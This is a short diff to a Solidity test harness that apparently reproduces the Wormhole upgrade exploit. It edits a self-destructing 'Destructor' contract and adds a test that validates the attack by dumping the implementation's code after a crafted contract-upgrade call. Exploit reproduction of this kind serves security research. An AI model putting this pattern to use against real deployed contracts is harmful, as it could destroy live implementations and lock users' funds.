@@ -56,7 +56,8 @@ contract Destructor {
 
   function destruct() external {
     console.log("Self-destructing...");
-    selfdestruct(payable(msg.sender));
+    console.log(address(this));
+    selfdestruct(payable(address(this)));
   }
 }
 
@@ -170,7 +171,10 @@ contract ExploitWormhole is TestHarness {
         console.logBytes(vm.payload);
 
         wormholeimpl.submitContractUpgrade(_vm);
+    }
 
+    function test_validate_attack() external {
+      console.log("Validating attack...");
         dumpCode(address(wormholeimpl));
     }
 }
